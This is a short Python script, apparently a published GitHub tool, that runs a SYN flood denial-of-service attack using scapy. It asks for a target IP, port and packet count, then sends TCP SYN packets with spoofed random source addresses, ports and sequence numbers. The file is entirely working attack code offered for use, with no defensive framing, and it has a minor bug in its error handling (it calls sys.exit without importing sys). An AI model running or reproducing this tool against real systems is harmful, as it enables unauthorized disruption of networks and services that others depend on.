#!/usr/bin/env python3
# Emre Ovunc
# info@emreovunc.com
# Python3 SYN Flood Tool

from os import system
from sys import stdout
from scapy.all import IP, TCP, send
from random import randint

def random_ip() -> str:
    return ".".join(map(str, (randint(0, 255) for _ in range(4))))

def rand_int() -> int:
    return randint(1000, 9000)

def syn_flood(dst_ip: str, dst_port: int, counter: int):
    print("Packets are being sent...")
    total = 0
    for _ in range(counter):
        ip_packet = IP(src=random_ip(), dst=dst_ip)
        tcp_packet = TCP(sport=rand_int(), dport=dst_port, flags="S", seq=rand_int(), window=rand_int())
        send(ip_packet/tcp_packet, verbose=False)
        total += 1
    stdout.write(f"\nTotal packets sent: {total}\n")

def info() -> tuple:
    system("clear")
    print("#####################################")
    print("#        github.com/EmreOvunc       #")
    print("#####################################")
    print("# Welcome to Python3 SYN Flood Tool #")
    print("#####################################")

    dst_ip = input("\nTarget IP: ")
    try:
        dst_port = int(input("Target Port: "))
    except ValueError:
        print("Invalid port number. Exiting.")
        sys.exit(1)

    return dst_ip, dst_port

def main():
    dst_ip, dst_port = info()
    try:
        counter = int(input("How many packets do you want to send: "))
    except ValueError:
        print("Invalid number of packets. Exiting.")
        sys.exit(1)
    syn_flood(dst_ip, dst_port, counter)

if __name__ == "__main__":
    main()
